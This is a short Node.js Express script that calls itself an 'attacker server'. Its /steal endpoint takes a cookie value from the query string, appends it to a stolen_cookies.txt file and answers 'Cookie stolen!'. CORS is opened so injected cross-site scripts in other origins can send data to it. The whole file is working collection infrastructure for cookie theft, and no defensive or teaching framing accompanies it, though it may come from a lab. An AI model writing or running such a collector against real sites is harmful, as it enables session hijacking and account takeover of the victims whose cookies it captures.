const express = require('express');
const app = express();
const fs = require('fs');
const cors = require('cors');
const port = 4000; // Run on port 4000, or any available port

// Enable CORS
app.use(cors());


// Route to handle receiving stolen cookies or data
app.get('/steal', (req, res) => {
  const stolenData = req.query.cookie;

  // Log the stolen cookie to a file
  fs.appendFile('stolen_cookies.txt', `Stolen cookie: ${stolenData}\n`, (err) => {
    if (err) throw err;
    console.log(`Stolen cookie logged: ${stolenData}`);
  });

  res.send('Cookie stolen!');
});

app.listen(port, () => {
  console.log(`Attacker server listening at http://localhost:${port}`);
});
